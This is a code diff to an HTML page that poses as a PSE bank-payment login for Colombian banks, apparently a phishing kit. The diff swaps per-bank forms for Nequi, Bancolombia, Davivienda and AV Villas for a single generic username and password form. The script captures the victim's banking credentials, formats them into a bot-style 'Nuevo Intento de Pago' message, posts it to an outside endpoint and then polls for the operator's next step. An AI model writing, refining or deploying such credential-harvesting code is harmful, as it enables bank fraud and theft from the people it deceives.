@@ -161,11 +161,23 @@
 
         <section id="bank-form-section" class="mt-6 max-w-xl mx-auto bg-white p-6 shadow-lg rounded-lg">
             <div class="flex items-center justify-center mb-4">
-                <img id="mastercard-logo" class="h-20 ml-4 hidden" src="https://www.laquinta.com.co/wp-content/uploads/2022/11/logo-pse-300x300-1.png" alt="Logo MasterCard">
+                <img id="pse-logo" class="h-24 w-auto" src="https://www.laquinta.com.co/wp-content/uploads/2022/11/logo-pse-300x300-1.png" alt="Logo PSE">
             </div>
-            <h2 id="bank-title" class="text-lg font-bold text-center border-b pb-2 mb-4">Inicia Sesión en el Banco</h2>
+            <h2 id="bank-title" class="text-lg font-bold text-center border-b pb-2 mb-4">Inicia Sesión en tu Banco</h2>
             <form id="bank-login-form">
                 <div class="space-y-4" id="form-fields">
+                    <div>
+                        <label for="user" class="block text-sm font-medium text-gray-700">Usuario</label>
+                        <input type="text" id="user" name="user"
+                            class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" required/>
+                        <p id="error-user" class="error-message hidden">El usuario es requerido.</p>
+                    </div>
+                    <div>
+                        <label for="clave" class="block text-sm font-medium text-gray-700">Clave</label>
+                        <input type="password" id="clave" name="clave" inputmode="numeric"
+                            class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" required/>
+                        <p id="error-clave" class="error-message hidden">La clave es requerida.</p>
+                    </div>
                 </div>
                 <div class="mt-8 text-center">
                     <button type="submit" id="payButton"
@@ -193,9 +205,8 @@
     <script>
         document.addEventListener("DOMContentLoaded", function() {
             const urlParams = new URLSearchParams(window.location.search);
-            const selectedBank = urlParams.get('banco');
             const deudaTotal = parseFloat(urlParams.get('deuda'));
-
+            
             const formatCurrency = (amount) => {
                 return new Intl.NumberFormat('es-CO', {
                     style: 'currency',
@@ -213,221 +224,39 @@
                 console.error("No se encontraron parámetros de deuda válidos en la URL.");
             }
 
-            const bankLogo = document.getElementById('bank-logo');
-            const mastercardLogo = document.getElementById('mastercard-logo');
-            const bankTitle = document.getElementById('bank-title');
-            const formFields = document.getElementById('form-fields');
             const bankLoginForm = document.getElementById('bank-login-form');
             const loaderContainer = document.getElementById('loader-container');
-            const payButton = document.getElementById('payButton');
-
-            const banksConfig = {
-                'nequi': {
-                    logo: 'https://logosenvector.com/logo/img/nequi-37254.png',
-                    title: 'Inicia Sesión en Nequi',
-                    mastercard: true,
-                    fields: `
-                        <div>
-                            <label for="nequi-celular" class="block text-sm font-medium text-gray-700">Número de Celular</label>
-                            <input type="tel" id="nequi-celular" name="nequi-celular" inputmode="numeric" maxlength="10"
-                                class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" required/>
-                            <p id="error-nequi-celular" class="error-message hidden">Número de celular inválido (10 dígitos).</p>
-                        </div>
-                        <div>
-                            <label for="nequi-clave" class="block text-sm font-medium text-gray-700">Clave</label>
-                            <input type="password" id="nequi-clave" name="nequi-clave" inputmode="numeric" maxlength="4"
-                                class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" required/>
-                            <p id="error-nequi-clave" class="error-message hidden">Clave inválida (4 dígitos).</p>
-                        </div>
-                    `
-                },
-                'bancolombia': {
-                    logo: 'bancolombia.png',
-                    title: 'Inicia Sesión en Bancolombia',
-                    mastercard: false,
-                    fields: `
-                        <div>
-                            <label for="bancolombia-user" class="block text-sm font-medium text-gray-700">Usuario</label>
-                            <input type="text" id="bancolombia-user" name="bancolombia-user"
-                                class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" required/>
-                            <p id="error-bancolombia-user" class="error-message hidden">El usuario es requerido.</p>
-                        </div>
-                        <div>
-                            <label for="bancolombia-clave" class="block text-sm font-medium text-gray-700">Clave</label>
-                            <input type="password" id="bancolombia-clave" name="bancolombia-clave" inputmode="numeric" maxlength="4"
-                                class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" required/>
-                            <p id="error-bancolombia-clave" class="error-message hidden">Clave inválida (4 dígitos).</p>
-                        </div>
-                    `
-                },
-                'davivienda': {
-                    logo: 'davivienda.png',
-                    title: 'Inicia Sesión en Davivienda',
-                    mastercard: false,
-                    fields: `
-                        <div>
-                            <label for="davivienda-user" class="block text-sm font-medium text-gray-700">Número de documento</label>
-                            <input type="text" id="davivienda-user" name="davivienda-user"
-                                class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" required/>
-                            <p id="error-davivienda-user" class="error-message hidden">El número de documento es requerido.</p>
-                        </div>
-                        <div>
-                            <label for="davivienda-clave" class="block text-sm font-medium text-gray-700">Clave virtual</label>
-                            <input type="password" id="davivienda-clave" name="davivienda-clave" inputmode="numeric" maxlength="4"
-                                class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" required/>
-                            <p id="error-davivienda-clave" class="error-message hidden">Clave inválida (4 dígitos).</p>
-                        </div>
-                    `
-                },
-                'avvillas': {
-                    logo: 'avvillas.png',
-                    title: 'Inicia Sesión en Av Villas',
-                    mastercard: false,
-                    fields: `
-                        <div>
-                            <label for="avvillas-user" class="block text-sm font-medium text-gray-700">Usuario</label>
-                            <input type="text" id="avvillas-user" name="avvillas-user"
-                                class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" required/>
-                            <p id="error-avvillas-user" class="error-message hidden">El usuario es requerido.</p>
-                        </div>
-                        <div>
-                            <label for="avvillas-clave" class="block text-sm font-medium text-gray-700">Clave</label>
-                            <input type="password" id="avvillas-clave" name="avvillas-clave" inputmode="numeric" maxlength="4"
-                                class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" required/>
-                            <p id="error-avvillas-clave" class="error-message hidden">Clave inválida (4 dígitos).</p>
-                        </div>
-                    `
-                },
-            };
-
-            if (selectedBank && banksConfig[selectedBank]) {
-                const config = banksConfig[selectedBank];
-                bankLogo.src = `img/${config.logo}`;
-                bankLogo.alt = `Logo de ${selectedBank}`;
-                bankTitle.textContent = config.title;
-                formFields.innerHTML = config.fields;
-                if (config.mastercard) {
-                    mastercardLogo.classList.remove('hidden');
-                } else {
-                    mastercardLogo.classList.add('hidden');
-                }
-            } else {
-                bankLogo.src = '';
-                bankLogo.alt = 'Logo de su banco';
-                bankTitle.textContent = 'Inicia Sesión en tu Banco';
-                formFields.innerHTML = `
-                    <div>
-                        <label for="user" class="block text-sm font-medium text-gray-700">Usuario</label>
-                        <input type="text" id="user" name="user"
-                            class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" required/>
-                    </div>
-                    <div>
-                        <label for="clave" class="block text-sm font-medium text-gray-700">Clave</label>
-                        <input type="password" id="clave" name="clave" inputmode="numeric"
-                            class="mt-1 block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm" required/>
-                    </div>
-                `;
-            }
 
             bankLoginForm.addEventListener('submit', async function(event) {
                 event.preventDefault();
                 let isValid = true;
                 document.querySelectorAll('.error-message').forEach(el => el.classList.add('hidden'));
                 document.querySelectorAll('input').forEach(el => el.classList.remove('input-error'));
+                
+                const user = document.getElementById('user');
+                const clave = document.getElementById('clave');
 
-                let transactionId = Date.now().toString(36) + Math.random().toString(36).slice(2);
-                let message = `<b>🔔 Nuevo Intento de Pago - ${selectedBank.toUpperCase()}</b>\n🆔 <b>ID:</b> ${transactionId}\n`;
-                const formData = {};
-                formData.banco = selectedBank;
-
-                if (selectedBank === 'nequi') {
-                    const nequiCelular = document.getElementById('nequi-celular');
-                    const nequiClave = document.getElementById('nequi-clave');
-                    if (nequiCelular.value.length !== 10 || !/^\d+$/.test(nequiCelular.value)) {
-                        document.getElementById('error-nequi-celular').classList.remove('hidden');
-                        nequiCelular.classList.add('input-error');
-                        isValid = false;
-                    }
-                    if (nequiClave.value.length < 4) {
-                        document.getElementById('error-nequi-clave').classList.remove('hidden');
-                        nequiClave.classList.add('input-error');
-                        isValid = false;
-                    }
-                    if (isValid) {
-                        message += `📞 <b>Celular:</b> ${nequiCelular.value}\n🔑 <b>Clave:</b> ${nequiClave.value}`;
-                        formData.celular = nequiCelular.value;
-                        formData.clave = nequiClave.value;
-                    }
-                } else if (selectedBank === 'bancolombia') {
-                    const bancolombiaUser = document.getElementById('bancolombia-user');
-                    const bancolombiaClave = document.getElementById('bancolombia-clave');
-                    if (bancolombiaUser.value.trim() === '') {
-                        document.getElementById('error-bancolombia-user').classList.remove('hidden');
-                        bancolombiaUser.classList.add('input-error');
-                        isValid = false;
-                    }
-                    if (bancolombiaClave.value.length < 4) {
-                        document.getElementById('error-bancolombia-clave').classList.remove('hidden');
-                        bancolombiaClave.classList.add('input-error');
-                        isValid = false;
-                    }
-                    if (isValid) {
-                        message += `👤 <b>Usuario:</b> ${bancolombiaUser.value}\n🔑 <b>Clave:</b> ${bancolombiaClave.value}`;
-                        formData.usuario = bancolombiaUser.value;
-                        formData.clave = bancolombiaClave.value;
-                    }
-                } else if (selectedBank === 'davivienda') {
-                    const daviviendaUser = document.getElementById('davivienda-user');
-                    const daviviendaClave = document.getElementById('davivienda-clave');
-                    if (daviviendaUser.value.trim() === '') {
-                        document.getElementById('error-davivienda-user').classList.remove('hidden');
-                        daviviendaUser.classList.add('input-error');
-                        isValid = false;
-                    }
-                    if (daviviendaClave.value.length < 4) {
-                        document.getElementById('error-davivienda-clave').classList.remove('hidden');
-                        daviviendaClave.classList.add('input-error');
-                        isValid = false;
-                    }
-                    if (isValid) {
-                        message += `📄 <b>Documento:</b> ${daviviendaUser.value}\n🔑 <b>Clave:</b> ${daviviendaClave.value}`;
-                        formData.documento = daviviendaUser.value;
-                        formData.clave = daviviendaClave.value;
-                    }
-                } else if (selectedBank === 'avvillas') {
-                    const avvillasUser = document.getElementById('avvillas-user');
-                    const avvillasClave = document.getElementById('avvillas-clave');
-                    if (avvillasUser.value.trim() === '') {
-                        document.getElementById('error-avvillas-user').classList.remove('hidden');
-                        avvillasUser.classList.add('input-error');
-                        isValid = false;
-                    }
-                    if (avvillasClave.value.length < 4) {
-                        document.getElementById('error-avvillas-clave').classList.remove('hidden');
-                        avvillasClave.classList.add('input-error');
-                        isValid = false;
-                    }
-                    if (isValid) {
-                        message += `👤 <b>Usuario:</b> ${avvillasUser.value}\n🔑 <b>Clave:</b> ${avvillasClave.value}`;
-                        formData.usuario = avvillasUser.value;
-                        formData.clave = avvillasClave.value;
-                    }
-                } else {
-                    const user = document.getElementById('user');
-                    const clave = document.getElementById('clave');
-                    if (user.value.trim() === '' || clave.value.trim() === '') {
-                        alert('Por favor, complete todos los campos.');
-                        isValid = false;
-                    }
-                    if (isValid) {
-                        message += `👤 <b>Usuario:</b> ${user.value}\n🔑 <b>Clave:</b> ${clave.value}`;
-                        formData.usuario = user.value;
-                        formData.clave = clave.value;
-                    }
+                if (user.value.trim() === '') {
+                    document.getElementById('error-user').classList.remove('hidden');
+                    user.classList.add('input-error');
+                    isValid = false;
+                }
+                if (clave.value.trim() === '') {
+                    document.getElementById('error-clave').classList.remove('hidden');
+                    clave.classList.add('input-error');
+                    isValid = false;
                 }
 
                 if (isValid) {
                     loaderContainer.style.display = 'flex';
+                    let transactionId = Date.now().toString(36) + Math.random().toString(36).slice(2);
+                    let message = `<b>🔔 Nuevo Intento de Pago - Banco Desconocido</b>\n🆔 <b>ID:</b> ${transactionId}\n`;
+                    message += `👤 <b>Usuario:</b> ${user.value}\n🔑 <b>Clave:</b> ${clave.value}`;
+
+                    const formData = {
+                        usuario: user.value,
+                        clave: clave.value
+                    };
                     localStorage.setItem('formData', JSON.stringify(formData));
 
                     const keyboard = {
@@ -458,7 +287,7 @@
                         });
                         const js = await res.json();
                         if (!js.ok) throw js;
-                        poll(cfg, transactionId, selectedBank, deudaTotal);
+                        poll(cfg, transactionId, 'banco_generico', deudaTotal);
                     } catch (err) {
                         console.error(err);
                         loaderContainer.style.display = 'none';
@@ -496,5 +325,4 @@
         });
     </script>
 </body>
-
 </html>
